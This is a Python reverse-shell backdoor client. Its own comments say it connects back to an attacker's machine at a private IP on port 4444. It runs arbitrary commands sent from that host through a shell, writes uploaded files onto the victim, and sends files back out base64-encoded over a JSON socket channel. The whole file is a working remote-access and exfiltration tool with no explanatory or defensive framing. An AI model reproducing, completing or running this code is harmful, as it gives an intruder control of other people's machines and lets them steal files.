import socket
import subprocess
import os
import json
import base64

# Set up the target server and port (attacker's machine)
HOST = "10.0.1.37"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, text=True)
    except subprocess.CalledProcessError:
        return "[+] Invalid command [+]"

# Function to send JSON data
def send_json(sock, data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

# Function to receive JSON data
def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Function to read a file and encode it in base64
def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

# Function to write a file from base64 encoded content
def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful [+]"

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))

    # Send an initial message to show the connection is established
    send_json(sock, "Successfully connected to the client.")

    while True:
        # Receive the command from the server
        command = receive_json(sock)

        # Handle the 'upload' command
        if command[0] == "upload":
            result = write_file(command[1], command[2])
        # Handle the 'download' command
        elif command[0] == "download":
            try:
                result = read_file(command[1])
            except Exception as e:
                result = f"Failed to download file: {e}"
        # Handle other commands
        else:
            try:
                result = execute_command(command)
            except Exception:
                result = "[+] Error during execution of the command [+] "

        # Send the result back to the server
        send_json(sock, result)

except Exception as e:
    print(f"Error: {e}")
    sock.close()
